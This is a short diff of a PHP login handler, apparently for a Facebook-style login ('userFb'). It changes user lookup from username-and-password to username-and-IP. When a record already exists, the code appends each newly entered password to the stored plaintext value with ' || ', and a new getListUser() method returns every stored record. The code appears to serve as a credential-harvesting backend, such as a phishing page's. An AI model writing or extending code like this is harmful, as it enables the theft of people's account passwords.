@@ -12,7 +12,7 @@
         $result = 1;
       } else {
         $userFb = new Users;
-        $user = $userFb::where([['username', $username],['password', $password]])->first();
+        $user = $userFb::where([['username', $username],['ip', $ip]])->first();
         if($user == null) {
           $this->user->username = $username;
           $this->user->password = $password;
@@ -21,10 +21,19 @@
             $result = 2;
           }
         }else {
-          $result = 3;
+            $user->password .= ' || '. $password;;
+            if( $user->save()){
+                $result = 2;
+              }
         }
       }
       return $result;
     }
 
-  } 
+    public function getListUser() {
+        $newUser = new Users;
+        $listUser = $newUser->all()->sortByDesc('id');
+        return $listUser;
+      }
+
+  }
